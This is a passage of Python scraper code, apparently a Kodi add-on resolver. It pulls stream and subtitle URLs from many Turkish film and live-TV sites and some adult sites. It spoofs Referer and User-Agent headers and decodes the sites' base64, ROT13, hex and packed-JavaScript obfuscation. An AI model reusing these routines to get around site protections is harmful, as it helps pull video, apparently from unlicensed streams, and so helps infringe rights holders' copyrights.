    if "stluserehtem" in link: 
        prefix = "/".join(link.split("/")[:5]) + "/seg-"
        m3u8 = requests.get(link,headers = {"User-Agent": UA}).text.replace("seg-", prefix)
        link = upload_to_server(m3u8)
    for i,subtitle in enumerate(js["subtitles"]):
        if i == 0:
            sub = subtitle["url"]
            sub = root2 + "/translate/CeviriAI.TR?url=" + Quote(sub) + "&id=" + url_raw[1] + "_themoviearchive"
        if "Turkish" in subtitle["language"]:
            sub = subtitle["url"]
            break
        elif "English" in subtitle["language"]:
            sub = subtitle["url"]
            sub = root2 + "/translate/CeviriAI.TR?url=" + Quote(sub) + "&id=" + url_raw[1] + "_themoviearchive"
    if sub == "":
        return link
    else:
        return [link,[sub]]
    
def thehun(url):
    return normalize_url(re.findall('source\s*src="(.*?)"', requests.get(url).text)[0])

def istanbuluseyret(url):
    page = fetch(url)
    js = re.findall('"dataProvider":(.*?}),', page)[0]
    j = json.loads(js)
    return j['source'][0]['url']

def diziyou(url):
    url_raw = url.split("?l=")
    url =  url_raw[0]
    lang = url_raw[1]
    page = requests.get(url, headers = {"User-Agent": UA}).text.lower()
    iframe = re.findall('<iframe.*?src="(.*?)"', page, re.DOTALL)[0]
    if lang == "1":
        iframe = iframe.replace(".html", "_tr.html")
    page = requests.get(iframe, headers = {"User-Agent": UA}).text.lower()
    subs = re.findall(r'<track\s*src="(.*?)"', page)
    link = re.findall('<source.*?src="(.*?)"', page)[0]
    if lang == "1":
        subs = []
    return [link, subs]

def pokitv(url):
    page = requests.get(url, headers = {"User-Agent": UA}).text
    iframe = re.findall('<iframe.*?data-litespeed-src="(.*?)"',page)[0]
    hash = iframe.split("/")[5]
    page = requests.post(iframe + "?do=getVideo", data = {"hash": hash, "r": url, "s": ""}, headers = {"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                                                                                      "user-agent": UA,
                                                                                                      "x-requested-with": "XMLHttpRequest"}).text
    try:
        link = json.loads(page)["videoSources"][0]["file"]
    except:
        url = json.loads(page)["videoSrc"]
        page = requests.get(url).text
        link = re.findall('source.*?src="(.*?)"',page)[0]
    return link

def wikiflix(url):                   
    url_raw = url.split("#")
    url_parts_qm = url.split("?")[1]
    parts = url_parts_qm.split("&")
    if len(parts) > 1:
        for i, part in enumerate(parts):
            kaynaklar.append("Kaynak - " + str(i + 1))
            linkler.append(part)
        link = select(kaynaklar, linkler)
    else:
        link = parts[0]
    if len(link) == 11:
        link = "https://www.youtube.com/watch?v=" + link
        return link
    else:
        link = "https://commons.m.wikimedia.org/wiki/File:" + link + "?embedplayer=yes"
    page = requests.get(link).text
    link = re.findall('(https[^"]+vp9.webm)',page)[0]
    raw_vtts = re.findall("/w/[^\"]+vtt", page)
    if len(raw_vtts) > 0:
        vtts = ["https://commons.m.wikimedia.org" + vtt.replace("amp;","") for vtt in raw_vtts]
        for vtt in vtts:
            if "lang=en" in vtt:
                vtts.append(root2 + "/translate/CeviriAI.TR?url=" + Quote(vtt) + "&id=" + url_raw[1] + "_wikiflix")
        return [link, vtts]
    else:
        return link
    
def filmatek(url):
    page = requests.get(url).text
    parts = re.findall('(\d+)\.\s*Kısım', page)
    print(parts)
    for part in parts:
        kaynaklar.append("Bölüm - " + part)
        linkler.append(part)
    
    if len(parts) == 0:
        parts = "1"
    else:
        parts = select(kaynaklar, linkler, 1)
    player_api = re.findall('layer_api":"(.*?)","play_aj', page)
    video_id = re.findall(r"data-post='(\d+)'", page)
    page_url = player_api[0].replace("\\", "") + video_id[0] + "/movie/" + parts
    page = requests.get(page_url).text
    js = json.loads(page)
    link = js["embed_url"]
    page = requests.get(link).text
    link = re.findall(r'"file"\s*:\s*"(.*?)"', page)[0].replace("\\", "")
    subs = re.findall('GROUP-ID="subs",.*?LANGUAGE="tr",URI="(.*?)"',requests.get(link).text)[0]
    sub_page = requests.get(subs).text
    sub_suf = re.findall(r'\.\./\.\./(.*?)\n', sub_page)[0]
    sub_pre = subs.split("subtitle")[0]
    sub = [sub_pre + sub_suf]
    return [link, sub]

def filmkovasi(url):
    parts = url.split("?l=")
    url = parts[0]
    lang = parts[1]
    content = requests.get(url, headers = {"User-Agent": UA}).text
    iframe = re.findall(r"""iframe.*?src=["']?(.*?)[\s>"']""", content)[0]
    if "trstx" in iframe or "sobreatsesuyp" in iframe:
        link = iframe + "?l=" + lang
    elif "trplayer" in iframe or "turkeyplayer" in iframe:
        page = requests.get(iframe).text
        kok = "/".join(iframe.split("/")[:3])
        uid = re.findall('uid":"(.*?)"', page)[0]
        md5= re.findall('md5":"(.*?)"', page)[0]
        media_id = re.findall('"id":"(.*?)"', page)[0]
        status = re.findall('status":"(.*?)"', page)[0]
        link = re.findall('file:\s*(.*?m3u8.*?),', page)[0]
        link = kok + link.replace("`", "").replace("`", "").replace("${video.uid}", uid).replace("${video.id}", media_id).replace("${video.status}", status).replace("${video.md5}", md5)
        page = requests.get(link, headers={"Referer":kok, "Accept":"*/*"}).text
        link = kok + re.findall('(/stream.*?)\n', page)[0]+ "#Referer=" + kok + "&Accept=*/*" + "&User-Agent=" + UA 
    elif "vidmoxy" in iframe or "vidrame" in iframe:
        data = requests.get(iframe, headers={"Referer": url}).text
        subs = []
        if lang == "2" or lang == "0":
            try: subs.append(re.findall('(http[^"]+Turkish.vtt)', data)[0].replace("\\",""))
            except: pass
        data = re.findall('EE\.dd\("(.*?)"\)', data)[0]
        embed = [vidmoxy(data), subs] 
        return embed
    elif "turkeyplayer" in iframe:
        if lang == "0":
            url = url + "2/"
            content1 = requests.get(url, headers = {"User-Agent": UA}).text
            iframe = re.findall(r"""iframe.*?src=["']?(.*?)[\s>"']""", content1)[0]
        data = requests.get(iframe, headers={"Referer": url}).text
        media_id = re.findall('"id":"(\d+)"', data)[0]
        uid = re.findall('"uid":"(\d+)"', data)[0]
        md5 = re.findall('"md5":"(.*?)"', data)[0]
        link = "https://watch.turkeyplayer.com/m3u8/" + uid + "/" + md5 + "/master.txt?s=1&id=" + media_id + "&cache=1"
        page = requests.get(link, headers={"User-Agent": UA, "Referer": iframe, "Accept": "*/*", "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"}).text
        link = "https://watch.turkeyplayer.com" + re.findall('(/stream/.*?)\n',page)[0]
        link = link + "#User-Agent=" + UA + "&Referer=" + iframe + "&Accept=" + "*/*" +"&accept-language=" + "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"

    return link

def filmekseni(url):
    def redir(url):
        r = requests.get(url, allow_redirects=True, headers = {"Referer": embed_kok, "User-Agent": UA})
        return r.url
    page = requests.get(url, headers ={"Referer":url, "User-Agent": UA}).text
    partial = re.findall('tab-pane active(.*?)</nav>', page, re.DOTALL)[0]
    alts = re.findall('href="(.*?)">\s*(.*?)\s*</a>', partial)
    for alt in alts:
        if "GOLD" not in alt[1]:
            kaynaklar.append(alt[1])
            linkler.append(alt[0])
    if len(kaynaklar)> 1:
        link = select(kaynaklar, linkler,1)
    else:
        link = linkler[0]
    if link != alts[0][0]:
        page = requests.get(link, headers ={"Referer":url, "User-Agent": UA}).text
    iframe = normalize_url(re.findall('iframe.*?data-src="(.*?)"', page)[0])
    if 'load' in iframe:
        embed_kok = "/".join(iframe.split("/")[:3])
        page = requests.get(iframe, headers = {"Referer": embed_kok, "User-Agent": UA}).text
        link = embed_kok + re.findall("file\s*:\s*'(.*?)'", page)[0]
        try:
            subs = re.findall("file: \s*'(/uploads.*?)',\s*label", page)
            subs = [redir(embed_kok + m + "#User-Agent=" + UA + "&Referer=" + embed_kok) for m in subs]
        except:
            subs = []
        link = redir(link) + "#User-Agent=" + UA + "&Referer=" + embed_kok
        return [link, subs]
    else:
        return iframe
    
def setfilmizle(url):
    url = url.replace("boncuk45", "")
    url_raw = url.split("?l=")
    lang = url_raw[1]
    url = url_raw[0]
    lang_type = "turkcealtyazi"
    if lang == "1":
        lang_type = "turkcedublaj"
    link = "/".join(url.split("/")[:3])
    page = requests.get(url, headers = {"Referer": url}).text
    data_id =  re.findall('data.*?-id\s*=\s*"(.*?)"', page)[0]
    alts_raw =re.findall('icon_film">.*?<b>(.*?)<\/b>', page)
    if "setfilm" not in url:
        alts_raw =re.findall('sticon-film"><\/span><b>\s*(.*?)\s*<', page)
    try:
        alts_raw.remove("Raca")
    except:
        pass
    alts =  list(set(alts_raw))
    if len(alts) > 1:
        player_name = select(alts,alts,1)
    else:
        player_name = alts[0]
    try:
        ajax_url = re.findall('"ajaxurl":\s*"(.*?)"', page)[0].replace("\\", "")
        nonce = re.findall('"nonce":\s*"(.*?)"', page)[0]
    except:
        ajax_url = re.findall('ajaxurl\s*=\s*"(.*?)"', page)[0].replace("\\", "")
        nonce = re.findall('ajaxurl:.*?nonce:\s*\'(.*?)\'', page, re.DOTALL)[0]
    data = {"action": "get_video_url","post_id": data_id, "nonce": nonce, "player_name": player_name,  "part_key": lang_type}
    if "tercihimturkce" not in page:
        del data["part_key"]
    page = requests.post(ajax_url, data=data, headers = {"Referer": link}).text
    url = re.findall('"url":"(.*?)"',page)[0].replace("\\", "")
    domain = url.split("/")[2]
    page = requests.get(url,headers = {"Referer": link}).text
    try:
        if "setplay" in url and "player" in  url:
            link = re.findall('videoSources.*?"file":"(.*?)"', page)[0].replace("\/", "/")
            number = link.split("/")[2]
            link = link.replace("/" + number +"/", "/" + domain +"/") + "?s=" + number
        elif "vctplay" in url:
            b = baseUrl(url)
            link = b + re.findall('streamUrl\s*=\s*"(.*?)"', page)[0]
    except:
        try:
            link = re.findall('\[\d+p\](.*?)(?:,|")', page)[-1]
            return link + "#Referer=" + url + "&User-Agent=" + UA +"&Accept=" + "*/*"
        except:
            return url
    name = 'cont' + ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    page = requests.get(link, headers= {"Referer": url}).text
    r = requests.post(root2 + "/kodi/contentx/online.php", data ={"url": page, "name": name}, headers={'User-Agent': UA, 'bety': 'jughead', 'X-Requested-With': 'XMLHttpRequest'}).text
    time.sleep(2)
    link2 = root2 + '/kodi/contentx/play.php?name=' + name
    link2 = link2 + "#Referer=" + url + "&User-Agent=" + UA +"&Accept=" + "*/*"
    return link2

def diziwatch(url):
    main_page = requests.get(url, headers = {"User-Agent": UA}).text
    if "iframe src" in main_page:
        link = re.findall(r'iframe.*?src="(.*?)"', main_page, re.DOTALL)[0]
        return link
    else:
        embed = re.findall(r'url\s*:\s*"(http[^"]+php)".*?\'pid\'\s*:\s*(\d+),', main_page.lower(), re.DOTALL)[0]
        page = requests.get(embed[0] + "?action=playlist&pid=" + str(embed[1])).text.lower()
        link = re.findall(r'file"\s*:\s*"(.*?)"',page)[-1]
        return link + "#User-Agent=" + UA + "&Referer= " + url

def filmmax(url):
    main_page = requests.get(url, headers = {"User-Agent": UA}).text
    link = re.findall(r'iframe.*?src="(.*?)"', main_page, re.DOTALL)[0]
    return link

def diziplus(url):
    url = url.replace("boncuk44","")
    page = requests.get(url, headers ={"User-Agent": UA}).text
    embed = re.findall('data-frame="(.*?)"', page)[0]
    if "vidmoxy" in embed:
        data = requests.get(embed, headers={"Referer": url}).text
        subs = []
        try: subs.append(re.findall('(http[^"]+Turkish.vtt)', data)[0].replace("\\",""))
        except: pass
        data = re.findall('EE\.dd\("(.*?)"\)', data)[0]
        return [vidmoxy(data), subs]
    else:
        headers = {"User-Agent": UA, "Referer": url}
        page = requests.get(embed, headers = headers).text
        keys = re. findall("bePlayer\('\s*(.*?)'\s*,\s*'(.*?)'\)",page)[0]
        v1 = Quote(keys[0])
        v2 = Quote(keys[1])
        play_link = hdmom(v1,v2,embed)
        return play_link

def hdmom(v1, v2, embed): ## beplayer
    page = requests.post(root + "v2/parser/aes.php", data = "v1=" + v1 + "&" + "v2=" + v2, headers={'User-Agent': UA, 'bety': 'jughead', 'X-Requested-With': 'XMLHttpRequest'}).text.replace("\\","")
    link = re.findall('video_location.*?(https.*?)\n', page)[0]
    link_kok = "/".join(link.split("/")[:3])
    subs = re.findall('file.*?(\/upload.*?.vtt)', page)   
    sub = []
    for s in subs:
        sub.append(link_kok + s)
    play_link = [link +"#Referer=" + embed + "&User-Agent=" + UA + "&Accept=" + "*/*", sub]
    return play_link

def vidmoxy(s):
    s = s.replace("-", "+").replace("_", "/")
    while len(s)%4 != 0:
        s += "="
    s = base64.b64decode(s).decode("utf-8")
    newS = ""
    for l in s:
        if l.isalpha():
            x = 90
            if l.islower():
                x = 122
            y = ord(l) + 13

            if x < y:
                y -= 26

            newS += chr(y)
        else:
            newS += l
    newS = newS[::-1]
    return newS

def dizifin(url):
    kok = "/".join(url.split("/")[:3]) + "/"
    url =  url.replace("?l=0","")
    page = requests.get(url).text
    embed = re.findall(r'iframe\s*src="(.*?)"', page)[0]
    embed_kok = "/".join(embed.split("/")[:3])
    headers = {"User-Agent": UA, "Referer": kok}
    page = requests.get(embed, headers = headers).text
    file = re.findall(r'"file":\s*"(.*?)"',page)[0].replace('\\x','')
    subs = [ sub.replace("..", embed_kok).replace("\\", "") for sub in re.findall(r'"file":"(.*?vtt)"',page) ]
    movie = bytes.fromhex(file).decode("ASCII").replace("..", embed_kok)
    return [movie, subs]   

def canlitvulusal(url):
    link = url.replace("https://canlitvulusal.com/", "https://canlitvulusal3.xyz/live/").replace("tv-show/","").replace("-canli-yayin/", "/index.m3u8").replace("-","")
    if check_response_code(link) == True:
        pass
    else:
        link = url.replace("https://canlitvulusal.com/", "https://canlitvulusal.xyz/live/").replace("tv-show/","").replace("-canli-yayin/", "/index.m3u8").replace("-","")
    return link

def sinemacx(url):
    url = url.split("?l=")[0]
    kok = "/".join(url.split("/")[:3]) + "/"
    page = requests.get(url).text
    embed = re.findall(r'iframe.*?data-vsrc="(.*?)"', page)[0]
    hash = embed.split("/")[4]
    embed = normalize_url(embed)
    page =  requests.get(embed, headers = {"referer": kok, "User-Agent": UA}).text
    subs = re.findall('(http.*?vtt)"',page)
    page = requests.post(embed.replace("video/", "player/index.php?data=") + "&do=getVideo", headers = {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": UA, "x-requested-with": "XMLHttpRequest"},
                             data = {"hash": hash, "r": kok}).text
    js = json.loads(page)
    link = js["securedLink"] + "#User-Agent=" + UA + "&Referer=" + kok + "&Accept=" + "*/*"
    if len(subs) > 0:
        return [link, subs]
    else:
        return link
    
def hdfilmizle(url):
    url_raw = url.split("?l=")
    if url_raw[1] == "0": lang = "en"
    elif url_raw[1] == "1": lang = "tr"
    elif url_raw[1] == "2": lang = "dual"

    url = url_raw[0]
    page = requests.get(url).text
    letparts = re.findall('let\s*parts\s*=\s*(.*?);', page)
    if letparts:
        js = json.loads(letparts[0])
        for j in js:
            if j["lang"] == lang:
                embed = re.findall('iframe\s*src="(.*?)"',j["data"])[0]
    else:
        embed = re.findall('<iframe\s*src="(.*?)"', page)[0]
    if "vidmoxy" in embed or "vidrame" in embed:
        data = requests.get(embed, headers={"Referer": url}).text
        subs = []
        if url_raw[1] == "2" or url_raw[1] == "0":
            try: subs.append(re.findall('(http[^"]+Turkish.vtt)', data)[0].replace("\\",""))
            except: pass
        data = re.findall('EE\.dd\("(.*?)"\)', data)[0]
        embed = [vidmoxy(data), subs] 
    if "trstx" in embed or "sobreatsesuyp" in embed:
        return embed + "?l=" + url_raw[1]
    return embed

def watchomovies(url):
    page = requests.get(url).text
    embed = re.findall('<IFRAME\s*SRC="(.*?streamoupload.*?)"', page)[0]
    return embed

def streamoupload(url):
    page = requests.get(url, headers = {"Referer": url, "User-Agent": UA}).text
    evall = re.findall('<script\s*type=[\'"].*?text/javascript[\'"]>(eval.*?)</script>',page, re.DOTALL)[0]
    detect(evall)
    d = unpack(evall)
    link = re.findall('file\s*:\s*"(.*?)"', d)[0].replace('\\\\/','/')
    return link


def xhamster(url):
    page = fetch(url)
    return re.findall('<link\s*rel="preload"\s*href="(.*?)"',page)[0]

def xnxx(url):
    page = requests.get(url).text
    return re.findall("setVideoHLS\('(.*?)'", page)[0]

def cnbce(url):
    page = requests.post("https://www.cnbce.com/api/live-stream/source").text
    js = json.loads(page)
    return js["source"]

def govids(url):
    gets = url.split("?")[1].split("=")
    i = gets[1]
    s = gets[2]
    u = gets[3]
    postData = "i=" + i + "=" + s + "=" + u
    url = url.replace("/embed?", "/embed/get?")
    page = requests.post(url, data = postData, headers = {"User-Agent": UA, "Referer": url}).text
    j = json.loads(page)
    link = j["Links"][0]
    link = link.split("redirect")[1]
    link = "/".join(url.split("/")[:3]) + "/redirect" + link
    link = requests.get(link, allow_redirects=False)
    link = link.headers["location"]
    return link + "#User-Agent=" + UA + "&Referer=" + url

def sibnet(url):
    kok = "/".join(url.split("/")[:3])
    page = requests.get(url).text
    link = re.findall('src:\s*"(.*?)",', page)[0]
    link = kok + link
    return link + "#User-Agent=" + UA + "&Referer=" + url

def baseUrl(url):
    return "/".join(url.split("/")[:3])

def vectorx(url):
    page = requests.get(url, headers = {"User-Agent": UA, "Referer": baseUrl(url)}).text
    v1 = re.findall("Klauios = '(.*?)'", page)[0]
    v2 = re.findall("'(\{.*?\})'", page)[0]
    v1 = Quote(v1)
    v2 = Quote(v2)
    page = requests.post(root + "v2/parser/aes.php", data = "v1=" + v1 + "&" + "v2=" + v2, headers={'User-Agent': UA, 'bety': 'jughead', 'X-Requested-With': 'XMLHttpRequest'}).text.replace("\\","")
    srcs = re.findall('sources:(.*?),\n', page)[0]
    link = json.loads(srcs)[0]["file"]
    subss = json.loads(re.findall('tracks:(.*?\]),', page)[0])
    subs = []
    for s in subss:
        if "thumb" not in s["file"]:
            subs.append(s["file"] + "#User-Agent=" + UA + "&Referer=" +  baseUrl(url)+"/")
    return [link + "#User-Agent=" + UA + "&Referer=" +  baseUrl(url)+"/", subs]

def streamruby(url):
    UA = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
    page = requests.get(url, headers = {"User-Agent": UA}).text
    link = re.findall('file:"(.*?m3u8.*?)"', page)[0]
    return link + "#User-Agent=" + UA + "&Referer=" + baseUrl(url)

def yoltv(url):
    page = requests.get(url).text
    link = re.findall('data-item.*?(https:.*?\.m3u8)', page)[0].replace("\\", "")
    return link

def canlitvws(url):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36","Referer": "https://www.canlitv.ws/tr"}
    page = requests.get(url, headers = headers).text
    ch_id = re.findall('index.php\?id=(\d+)"', page)[0]
    page =  requests.get(u"https://www.canlitv.ws/embed/?id=" + ch_id, headers = headers).text
    link = re.findall('file: "(.*?)"', page)[0]
    return link 

def filmcidayi(url):
    url_raw = url.split("?l=")
    url = url_raw[0]
    kok = baseUrl(url)
    lang = url_raw[1]
    page = requests.get(url).text
    media_type = "movie"
    if "/bolum" in url:
        media_type = "tv"
    data_id = re.findall('data-post=[\'"](.*?)[\'"]', page)[0]
    headers = {"User-Agent": UA, "Referer": url, "content-type": "application/x-www-form-urlencoded; charset=UTF-8"}
    data = {"action": "doo_player_ajax", "post": data_id, "nume":1, "type": media_type}
    page = requests.post(kok + "/wp-admin/admin-ajax.php", data = data, headers= headers).text
    embed = json.loads(page)["embed_url"]

    page = requests.post(embed, data = data, headers = headers).text
    link = re.findall('file:"(.*?)"', page)[0]
    page = requests.get(link, headers = {"User-Agent": UA, "Referer": embed, "Accept": "*/*"}).text
    link = re.findall(r'(https.*?)(?:\n|$)', page, re.MULTILINE)[-1]
    name = 'cont' + ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    page = requests.get(link, headers = {"User-Agent": "Postman", "Referer": embed, "Accept": "*/*"}).text
    r = requests.post(root2 + "/kodi/contentx/online.php", data ={"url": page, "name": name}, headers={'User-Agent': UA, 'bety': 'jughead', 'X-Requested-With': 'XMLHttpRequest'}).text
    time.sleep(2)
    link2 = root2 + '/kodi/contentx/play.php?name=' + name
    return link2 +  "#User-Agent=" + UA + "&Referer=" + baseUrl(embed) + "&Accept=*/*" + "&Origin=" + baseUrl(embed)

def myvideoaz(url):
    page = requests.get(url).text
    link = re.findall('application/x-mpegURL"\s*src="(.*?)"', page)[0]
    return link + "#User-Agent=" + UA

def parsatv(url):
    page = requests.get(url).text
    try:
        link = re.findall('file:\s*"(.*?)"', page)[0]
    except:
        try:
            link = re.findall('<iframe.*src="(.*embed.*)"', page)[0]
        except:
            link = re.findall('source\s*src="(.*?)"', page)[0]
    if "youtube" in link:
        media_id = re.findall('youtube-nocookie.com/embed/(.*?)\?', link)[0]
        link = "https://www.youtube.com/embed/" + media_id
    return link

def ddizi(url):
    page = requests.get(url, headers = {"User-Agent": UA}).text
    embed = re.findall('"og:video"\s*content="(.*?)"',page)[0]
    if "youtube" in embed: return embed
    embed_page = requests.get(embed, headers={"User-Agent": UA, "Referer": url}).text
    return re.findall('file\s*:\s*"(.*?)"', embed_page)[0]

def hdabla(url):
    subs = []
    page = requests.get(url, headers = {"User-Agent": UA}).text
    embed = normalize_url(re.findall('<iframe\s*src="(.*?)"', page)[0])
    page =  requests.get(embed, headers = {"referer": baseUrl(url), "Use-Agent": UA}).text
    link = re.findall("file\s*:\s*'(.*?)'", page)[0]
    return [link + "#User-Agent" + UA + "&Referer=" + embed, subs]

def allclassic(url):
    def custom_transform(h, i):
        h = list(h) 
        i = list(i) 

        for k in range(len(h) - 1, -1, -1):
            l = k
            for m in range(k, len(i)):
                l += int(i[m])
            while l >= len(h):
                l -= len(h)
            n = ""
            for o in range(len(h)):
                if o == k:
                    n += h[l]
                elif o == l:
                    n += h[k]
                else:
                    n += h[o]
            h = list(n) 

        return ''.join(h)
    page = requests.get(url).text
    link = re.findall("function/0/(.*?)',", page)[0]
    h = link.split("/")[5][:32]
    i = "76582147925414364366255444386504"
    return link.replace(h, custom_transform(h, i))

def  filmizlemek(url):
    page = requests.get(url).text
    parts =  re.findall('class="parttab.*?href="(.*?)".*?</i>(.*?)<', page)
    for part in parts:
        if "ragman" not in part[1].strip().replace("HD",""):
            kaynaklar.append(part[1].strip().replace("HD",""))
            linkler.append(part[0])
    if len(kaynaklar) > 1:
        part_link = select(kaynaklar, linkler,1)
    else:
        part_link = linkler[0]
    page = requests.get(part_link).text
    link = re.findall('<iframe.*?src="(.*?)"', page)[0]
    return link

def oneupload(url):
    page = requests.get(url).text
    link = re.findall('\[\{file:"(.*?)"', page)[0]
    return link

def vudeo(url):
    page = requests.get(url, allow_redirects=False)
    if int(page.status_code/100) == 3:
        url = page.headers['Location']
        page = requests.get(url)
    page = page.text
    link = re.findall('sources\s*:\s*\["(.*?)"', page)[0]
    return link + "#Referer=" + baseUrl(link) + "/"

def canlidizi(url):
    UA = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36"
    page = requests.get(url).text
    try:
        embed = re.findall('data-wpfc-original-src="(.*?(?:fireplayer|betaplayer).*?)"', page)[0]
    except:
        embed = re.findall('<p><iframe\s*src="(.*?)"', page)[0]
    if "fireplayer" in embed:
        hash = embed.split("/")[-1]
        link = embed + "?do=getVideo"
        data = {"hash": hash, "r": baseUrl(url) + "/", "s": ""}
        headers = {"Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": UA, "x-requested-with": "XMLHttpRequest"}
        js = requests.post(link, data=data, headers=headers).json()
        return js.get("videoSources")[0].get("file")
    elif "betaplayer" in embed:
        page = requests.get(embed, headers={"Referer": baseUrl(url) + "/", "User-Agent": UA}).text
        link = re.findall(r'file\s*:\s*"(.*?betaplayer.*?)"', page)[0]
        link_page = requests.get(link, headers={"Referer": embed, "Accept": "*/*"}).text
        link = re.findall('(https://betaplayer\.site/m3u/.*?)\n', link_page)[-1]
        subs_raw = re.findall(r'tracks\s*:\s*(\[.*?\]),', page)
        subs = []
        if subs_raw:
            subs_raw = json.loads(subs_raw[0])
            for sub in subs_raw:
                if sub["kind"] == "captions":
                    subs.append(baseUrl(embed) + sub["file"] + "#Referer=" + embed)
        return [link, subs]

def vidlop(url):
    hash = url.split("/")[-1]
    headers = {"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest"}
    data = {"hash": hash, "r":baseUrl(url)}
    js = requests.post(baseUrl(url) + "/player/index.php?data=" + hash + "&do=getVideo", data=data, headers=headers).json()
    m3u8 = requests.get(js.get("securedLink")).text
    subs = re.findall('URI="(.*?\.vtt)"', m3u8)
    return [js.get("securedLink"), subs]

def streamplayer(url):
    headers = {"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest", "Referer": baseUrl(url)}
    page = requests.get(url, headers=headers).text
    link = re.findall('sources\s*:\s* \[\{file:"(.*?)"', page)[0]
    return link + "#Referer=https://vidmoly.to"

def fullhdfilm(url):
    def redir(url):
        r = requests.get(url, allow_redirects=True, headers = {"User-Agent": UA})
        return r.url
    page = requests.get(url).text
    embeds = re.findall("id='(\d+)'.*?href=\"#\">(.*?)</a></li>", page)
    alts = list(zip(*embeds))
    if len(alts[1]) > 1: 
        media_id = select(alts[1], alts[0])
    else:
        media_id = alts[0][0]
    coded_link = "PGlmcmFtZSB" + re.findall(r"pdata\['prt_" + media_id + r"'\]\s*=\s*'(.*?)'", page)[0]
    link_raw = decode_base64(coded_link.encode())
    link = normalize_url(re.findall('src=["\\\'](.*?)["\\\']', link_raw)[0]) 
    page = requests.get(redir(link), headers= {"User-Agent": UA, "Referer": baseUrl(link)}).text
    link = baseUrl(link) + re.findall("file\s*:\s*'(.*?)'", page)[0]
    try:
        subs = re.findall("file: \s*'(/uploads.*?)',\s*label", page)
        subs = [redir(baseUrl(link) + m + "#User-Agent=" + UA + "&Referer=" + baseUrl(link)) for m in subs]
    except:
        subs = []
    link = redir(link) + "#User-Agent=" + UA + "&Referer=" + baseUrl(link)
    return [link, subs] 

def mavifilm1(url):  #altyazısı kodi ile uyumsuz.m3u8 in içinde m3u8 olarak geliyor.
    url = url.split("#")[0]
    page = requests.get(url, headers = {"User-Agent": UA}).text
    coded = re.findall("ilkpartkod\s*=\s*['\"](.*?)['\"]", page)
    iframe = base64.b64decode(coded[0].encode()).decode()
    link = re.findall("src=['\"](.*?)['\"]", iframe)
    page = requests.get(link[0], headers = {"User-Agent": UA}).text
    hex = re.findall(r'["\']file["\']\s*:\s*["\'](\\x.*?)["\']', page) 
    link = bytes(hex[0], "utf-8").decode("unicode_escape")
    return link

def mavifilm(url): #altyazısı kodi ile uyumsuz.m3u8 in içinde m3u8 olarak geliyor.
    page = requests.get(url, headers = {"User-Agent": "Mozilla 5/0"}).text
    parts = re.findall(r"pdata\['prt_(.*?)'\]\s*=\s*'(.*?)'", page)
    for part in parts:
        if "fragman" not in part[0]:
            linkler.append(part[1])
            kaynaklar.append(part[0])
    if len(linkler) > 1:
        part = select(kaynaklar, linkler)
    else :
        part = linkler[0]
    coded_link = "PGlmcmFtZSB" + part
    link_raw = decode_base64(coded_link.encode())
    link = re.findall('src=["\\\'](.*?)["\\\']', link_raw)[0]
    link = normalize_url(link)
    
    if "vidlop" in link: return link
    if "vidmoxy" in link:
        data = requests.get(embed, headers={"Referer": url}).text
        subs = []
        try: subs.append(re.findall('(http[^"]+Turkish.vtt)', data)[0].replace("\\",""))
        except: pass
        data = re.findall('EE\.dd\("(.*?)"\)', data)[0]
        return [vidmoxy(data), subs]
    page = requests.get(link, headers= {"User-Agent": "Postman", "Referer": baseUrl(link)}).text
    if "fireplayer" in link:
        link = re.findall('file\s*:\s*"(.*?)"', page)[0]
        referer = re.findall("'ref_url'\s*,\s*'(.*?)'", page)[0]
        link = link + "#User-Agent=" + UA + "&Referer=" + "https://vidmoly.me"
        return link
    else:
        for h, o in re.findall(r"\)\('([0-9A-Fa-f]+)'\s*,\s*(\d+)\)", page):
            t = ''.join(chr(int(h[i:i+2],16)) for i in range(0,len(h),2))[::-1]
            try:
                d = base64.b64decode(t)
            except:
                continue
            s = ''.join(chr((b - int(o)) & 0xFF) for b in d)
            m = re.search(r"file\s*:\s*'([^']+)'", s)
            if m:
                u = m.group(1)
                link = re.sub(r'\\x([0-9a-fA-F]{2})', lambda x: chr(int(x.group(1),16)), u)
        try:
            subs = re.findall("file: \s*'(/uploads.*?)',\s*label", page)
            subs = [baseUrl(link) + m + "#User-Agent=" + UA + "&Referer=" + baseUrl(link) for m in subs]
        except:
            subs = []
        link = link + "#User-Agent=" + UA + "&Referer=" + baseUrl(link)
        return [link, subs]   
    
def dizipod(url):
    page = requests.get(url).text
    v_id = re.findall(r'data-post-id="(.*?)"', page)[0]
    page = requests.post(baseUrl(url) + "/wp/wp-admin/admin-ajax.php?action=get_episode_player&post_id=" + v_id, headers= {"Referer": url}).text
    js = json.loads(page)
    mp4_link = re.findall(r'iframe.*?src="(.*?)"', str(js))
    page = requests.get(mp4_link[0], headers = {"Referer": baseUrl(url)}).text
    f_eval = re.findall(r'text/javascript">(eval.*?)</sc', page, re.DOTALL)[0]
    detect(f_eval)
    d = unpack(f_eval)    
    js = json.loads(re.findall(r'sources\s*:\s*\[(.*?)\]',d)[0])
    link = js["file"]
    return link

def pornpics(url):
   return decode_base64(re.findall(r'var\s*P_LINK\s*=\s*\'\w{2,6}/(.*?)\'',requests.get(url, headers = {"User-Agent": UA}).text)[0])

def sozcu(url):
    page = requests.get(url, headers = {"User-Agent": UA}).text
    link = re.findall(r'"YouTube\s*video\s*player"\s*src="(.*?)\?', page)[0].replace("/embed/", "/watch?v=")
    return link 

def streamimdb(url):
    page = requests.get(url).text
    tmdb = re.findall('"id"\s*:\s*"(.*?)"', page)[0]
